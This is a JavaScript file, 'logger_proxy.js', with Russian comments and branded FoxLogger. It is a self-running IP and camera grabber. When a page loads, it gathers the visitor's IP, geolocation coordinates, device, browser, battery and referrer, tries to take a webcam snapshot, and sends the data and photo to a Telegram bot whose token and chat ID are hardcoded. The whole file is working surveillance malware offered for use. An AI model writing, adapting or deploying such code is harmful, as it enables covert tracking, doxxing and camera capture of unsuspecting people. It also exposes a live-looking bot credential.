// logger_proxy.js — ТОЛЬКО ТВОЙ ПРОКСИ, БЕЗ ЗЕРКАЛ
(async function() {
    "use strict";

    // ========== ТВОИ ДАННЫЕ ==========
    const TELEGRAM_BOT_TOKEN = "8916079717:AAFIrsjINbXmyyWZCmQGHak6DnjHGbi6-Xk";
    const TELEGRAM_CHAT_ID = "8995427762";
    
    // ТВОЙ ПРОКСИ
    const PROXY = "185.238.228.4:80";
    
    // Функция отправки через прокси
    async function sendViaProxy(url, options) {
        const proxyUrl = `https://cors-anywhere.herokuapp.com/${url}`;
        try {
            const response = await fetch(proxyUrl, options);
            return await response.json();
        } catch(e) {
            console.error("Proxy error:", e);
            throw e;
        }
    }

    // ========== 1. СБОР ДАННЫХ ==========
    
    // IP и геолокация
    let ipAddress = "0.0.0.0";
    let geo = "не определена";
    let city = "", country = "", lat = "", lon = "";

    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;

        const geoReq = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const geoData = await geoReq.json();
        
        city = geoData.city || "неизвестно";
        country = geoData.country_name || "неизвестно";
        lat = geoData.latitude || "?";
        lon = geoData.longitude || "?";
        geo = `${city}, ${country} (${lat}, ${lon})`;
    } catch(e) {
        console.warn("Geo error:", e);
    }

    // Время
    const now = new Date();
    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });

    // UserAgent и устройство
    const userAgent = navigator.userAgent;
    let deviceType = "не определено";
    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
        deviceType = "📱 Телефон";
    } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
        deviceType = "💻 Компьютер";
    }
    
    let browser = "неизвестно";
    if (userAgent.includes("Chrome")) browser = "Chrome";
    else if (userAgent.includes("Firefox")) browser = "Firefox";
    else if (userAgent.includes("Safari")) browser = "Safari";
    else if (userAgent.includes("Edge")) browser = "Edge";
    
    let os = "неизвестно";
    if (userAgent.includes("Windows")) os = "Windows";
    else if (userAgent.includes("Android")) os = "Android";
    else if (userAgent.includes("iOS")) os = "iOS";
    else if (userAgent.includes("Mac")) os = "MacOS";
    else if (userAgent.includes("Linux")) os = "Linux";

    // Батарея
    let battery = "не доступно";
    if (navigator.getBattery) {
        try {
            const b = await navigator.getBattery();
            battery = `${Math.round(b.level * 100)}% (${b.charging ? "🔋 заряжается" : "🪫 не заряжается"})`;
        } catch(e) {}
    }

    const screen = `${window.screen.width}x${window.screen.height}`;
    const language = navigator.language || "ru";

    // ========== 2. КАМЕРА ==========
    let photoBlob = null;
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.autoplay = true;
        
        await new Promise(resolve => {
            video.onloadedmetadata = () => {
                video.play();
                resolve();
            };
        });
        
        await new Promise(r => setTimeout(r, 500));
        
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.85));
        stream.getTracks().forEach(track => track.stop());
    } catch(e) {
        console.warn("Camera error:", e);
    }

    // ========== 3. ФОРМИРУЕМ СООБЩЕНИЕ ==========
    const message = `🦊 НОВЫЙ ПЕРЕХОД FOXLOGGER

🌐 IP: ${ipAddress}
📍 Гео: ${geo}
🕐 Время: ${timeStr}
📱 Устройство: ${deviceType}
🌍 Браузер: ${browser}
💿 ОС: ${os}
🔋 Батарея: ${battery}
📺 Экран: ${screen}
🌐 Язык: ${language}
📎 Ссылка: ${window.location.href}
🔗 Реферер: ${document.referrer || "прямой переход"}

━━━━━━━━━━━━━━━━━━━━━━
🦊 FoxLogger | @kuragalakrica`;

    // ========== 4. ОТПРАВКА ==========
    const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
    
    // Отправка текста
    async function sendText() {
        try {
            const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    disable_web_page_preview: true
                })
            });
            const result = await response.json();
            if (result.ok) {
                console.log("✅ Текст отправлен");
                return true;
            } else {
                console.log("❌ Ошибка:", result.description);
                return false;
            }
        } catch(e) {
            console.log("❌ Ошибка отправки:", e);
            return false;
        }
    }

    // Отправка фото
    async function sendPhoto() {
        if (!photoBlob) return false;
        
        try {
            const formData = new FormData();
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("photo", photoBlob, "snapshot.jpg");
            formData.append("caption", message);
            
            const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
                method: "POST",
                body: formData
            });
            const result = await response.json();
            if (result.ok) {
                console.log("✅ Фото отправлено");
                return true;
            } else {
                console.log("❌ Ошибка фото:", result.description);
                return false;
            }
        } catch(e) {
            console.log("❌ Ошибка отправки фото:", e);
            return false;
        }
    }

    // ЗАПУСК
    if (photoBlob) {
        await sendPhoto();
    } else {
        await sendText();
    }
})();
